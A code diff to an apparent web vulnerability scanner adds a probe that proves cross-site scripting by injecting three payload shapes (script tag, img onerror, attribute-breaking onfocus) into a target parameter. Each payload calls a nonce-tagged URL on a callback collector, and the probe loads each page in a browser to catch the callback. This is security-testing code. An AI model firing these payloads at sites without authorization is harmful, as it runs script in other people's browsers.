@@ -11,6 +11,7 @@ import json as _json
 import random
 import re
 import string
+import time
 import urllib.parse
 
 from .registry import Context, _ival
@@ -123,8 +124,106 @@ def _similarity(a: str, b: str) -> float:
 
 # ---------------------------------------------------------------------------
 
+def _prove_execution(ctx: Context, url: str, param: str, method: str,
+                     data: str | None) -> dict:
+    """Make the payload call home, and record the call.
+
+    Reflection is half of XSS and it is the half the bytes already show.
+    The other half is execution, and the browser's own answer to "did my
+    script run" would reach the gate through this probe - which is the one
+    thing `record_finding` refuses for every other class. So the payload is
+    written to DO something instead: fetch a URL carrying a nonce, from a
+    collector this package owns. The hit is recorded off that collector's
+    socket, and `proof.py` grades the hit.
+
+    Three payload shapes are sent because one reflection context swallows
+    the others: a bare `<script>` dies inside an existing attribute, and an
+    `onerror` never fires where markup is escaped but a script block is
+    not. Each carries its OWN nonce, so the callback names which shape ran
+    rather than leaving that to be inferred.
+    """
+    from argus import collector as _collector
+    from argus.tools import browser as _browser
+
+    if not _browser.available():
+        return {"attempted": False, "reason": _browser.why_unavailable()}
+    if str(method or "GET").upper() != "GET" and data is not None:
+        # Navigating re-issues a GET. Driving the browser at the endpoint
+        # would load a DIFFERENT request than the one that reflected, and
+        # a callback from it would be graded as proof about the POST. Say
+        # so rather than produce an answer about the wrong request.
+        return {"attempted": False,
+                "reason": "execution is only probed on GET so far: a "
+                          "navigation re-issues a GET, so a callback would "
+                          "be evidence about a request other than the one "
+                          "that reflected"}
+
+    col = _collector.Collector().start()
+    try:
+        shapes = {}
+        for label, template in (
+            ("script", "<script>fetch({u},{{mode:'no-cors'}})</script>"),
+            ("img", "<img src=x onerror=\"fetch({u},{{mode:'no-cors'}})\">"),
+            ("attr", "\" autofocus onfocus=fetch({u},{{mode:'no-cors'}}) x=\""),
+        ):
+            nonce = _collector.new_nonce()
+            shapes[label] = {"nonce": nonce,
+                             "payload": template.format(u=repr(col.url(nonce)))}
+        records, hits_out = [], []
+        for label, shape in shapes.items():
+            sent = _send(ctx, url, param, shape["payload"], method, data,
+                         tool="probe_reflection",
+                         note=f"xss execution probe ({label})")
+            records.append({"shape": label, "request_id": sent["request_id"]})
+            # Build the navigation URL the same way the request was built,
+            # with `_inject`, instead of reading it back off the client's
+            # return value. An earlier draft guessed `final_url` or `url`
+            # from there, found neither, and fell through to the bare
+            # endpoint - so the browser loaded `/search` with no payload on
+            # it, navigated fine, and nothing called back. The probe then
+            # reported "reflected but did not execute" about a page it had
+            # never actually visited, which is the worst shape of wrong: a
+            # confident negative.
+            target = _inject(url, param, shape["payload"])
+            at = time.time()
+            nav = _browser.visit(target)
+            # The navigation command returns when the page has loaded, which
+            # can be before a deferred or event-driven payload has run.
+            time.sleep(_browser.SETTLE_SECONDS)
+            for hit in col.hits_for(shape["nonce"], after=at):
+                req, resp = col.as_exchange(hit)
+                rid = ctx.session.record_exchange(
+                    "collector", req, resp,
+                    note=f"callback for the {label} payload")
+                hits_out.append({"shape": label, "request_id": rid,
+                                 "peer": hit.get("peer", "")})
+            records[-1]["navigated"] = bool(nav.get("ok"))
+            if not nav.get("ok"):
+                records[-1]["nav_error"] = nav.get("reason", "")
+        _browser.close()
+        return {"attempted": True, "sent": records, "callbacks": hits_out,
+                "executed": bool(hits_out),
+                "note": ("cite the payload request AND its callback together: "
+                         "the gate pairs them by nonce and refuses a hit that "
+                         "does not follow the request that sent it")
+                        if hits_out else
+                        ("the payload reflected but nothing called back, so it "
+                         "did not execute in a real browser")}
+    finally:
+        col.stop()
+
+
 def probe_reflection(ctx: Context, url: str, param: str,
-                     method: str = "GET", data: str | None = None) -> dict:
+                     method: str = "GET", data: str | None = None,
+                     prove_execution: bool = True) -> dict:
+    """Reflection from the bytes, and execution from a callback.
+
+    `prove_execution` drives `agent-browser` when it is on PATH. It is on
+    by default because the opposite default is how `xss` spent its life at
+    `candidate`: the equipment existed, the probe did not reach for it, and
+    the verdict blamed the package. With no browser installed this costs
+    one availability check and the result says so.
+    """
     canary = _marker("x")
     payload = f"{canary}<>'\"&=/"
     res = _send(ctx, url, param, payload, method, data, tool="probe_reflection",
@@ -150,6 +249,8 @@ def probe_reflection(ctx: Context, url: str, param: str,
         "excerpt": window,
         "note": "context tells you the payload shape; unescaped < > \" ' means exploitable",
     })
+    if prove_execution:
+        out["execution"] = _prove_execution(ctx, url, param, method, data)
     return out
 
 
